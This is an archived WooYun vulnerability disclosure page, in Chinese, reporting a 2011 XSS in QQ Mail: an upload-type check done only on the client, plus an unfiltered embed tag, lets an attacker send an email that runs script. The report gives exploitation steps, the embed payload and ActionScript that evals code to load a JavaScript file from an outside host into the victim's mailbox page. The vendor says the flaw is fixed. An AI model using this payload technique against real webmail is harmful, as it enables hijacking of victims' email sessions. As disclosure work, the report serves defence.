@@ -1,0 +1,252 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ邮箱XSS，邮件中可调用外部javascript文件  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ邮箱XSS，邮件中可调用外部javascript文件  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2011-11-15 21:15</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-11-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-11-16：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">这个是之前反馈的老漏洞了，咨询了下wooyun,回复说可以提交上来，于是就来提交了，想赚点Rank，不知道行不行啊!<br />
+<br />
+漏洞：QQ邮箱对上传图片部分，文件类型未过滤，同时对HTML标签&lt;embed&gt;在过滤上存在问题，2个联用导致可以通过上传FLASH文件，通过FLASH调用任意javascript文件。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞的主要成因：<br />
+<br />
+<br />
+<br />
+1. 对图片附件的上传，仅做了客户端判断，未在服务器上进行判断，我们可以绕过限制上传任意类型文件（本次主要是用来上传flash文件～）！<br />
+<br />
+2. 对HTML的过滤上存在问题，当 &lt;embed src=&quot;相对路径&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt; 中src=相对路径时，embed标签不会被过滤！<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">下面是漏洞利用过程！<br />
+<br />
+<br />
+<br />
+1. 文件类型仅在客户端验证，当我在QQ邮箱上传图片附件的位置，上传一个FLASH文件时，会有以下提示！<br />
+<br />
+</p><p class="detail"><a href="../images/15205842bc3d6ce8e5822c831cb4fe78d29fe839.jpg" target="_blank"><img src="../images/15205842bc3d6ce8e5822c831cb4fe78d29fe839.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+2. 抓包分析，可以发现，出现该提示时，并没有任何数据请求，即是在客户端进行了判断！<br />
+<br />
+<br />
+<br />
+3. 既然只在客户端做了判断，我们就自己上传其它类型文件试试（如何绕过客户端限制，这里就不多说了）。 结果：发现，除了图片之外，其它类型都可以上传。于是我们就上传一个自己的FLASH文件。<br />
+<br />
+</p><p class="detail"><a href="../images/152108085b11ac66428068c8758b23000a582f9d.jpg" target="_blank"><img src="../images/152108085b11ac66428068c8758b23000a582f9d.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上传成功后的页面里，可以找到上传成功的FLASH文件地址。<br />
+<br />
+<br />
+<br />
+4. 编写邮件，切换至HTML模式，写入以下内容<br />
+<br />
+<br />
+<br />
+&lt;embed src=&quot;刚才复制的FLASH文件地址&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt;<br />
+<br />
+&lt;img src=&quot;刚才复制的FLASH文件地址&quot;&gt;&lt;/img&gt;<br />
+<br />
+<br />
+<br />
+5. 发送邮件出去， 当对方点开邮件后， 效果如下（IE,chrome,FF下均有效）：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1521101037967460826ba76be2cbfdfb94d7147e.jpg" target="_blank"><img src="../images/1521101037967460826ba76be2cbfdfb94d7147e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 由于&lt;embed&gt; 标记里没有 allowscriptaccess 和 allownetworking来控制FLASH的权限！所以通过flash来执行JS代码不会受到限制。 <br />
+<br />
+<br />
+<br />
+最后附上所用FLASH的AS代码：<br />
+<br />
+<br />
+<br />
+package {<br />
+<br />
+ import flash.display.Sprite;<br />
+<br />
+ import flash.external.ExternalInterface;<br />
+<br />
+ public class QQmailTest extends Sprite<br />
+<br />
+ {<br />
+<br />
+  public function QQmailTest()<br />
+<br />
+  {<br />
+<br />
+   if(flash.external.ExternalInterface.available){<br />
+<br />
+    flash.external.ExternalInterface.call(&quot;eval&quot;,&quot;(function(){var s=document.createElement(&#039;script&#039;);s.type=&#039;text/javascript&#039;;s.src=&#039;http://www.toolmao.com/tool/qqmail.js&#039;;document.body.appendChild(s);})()&quot;);<br />
+<br />
+   }<br />
+<br />
+  }<br />
+<br />
+ }<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">由于是之前的漏洞，此漏洞已被厂商修复。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-03314" title="QQ邮箱XSS，邮件中可调用外部javascript文件">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2011-11-16 14:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢gainover报告的该漏洞，目前已经修复</p>
+													<p class="detail">漏洞Rank：8 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="3314";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
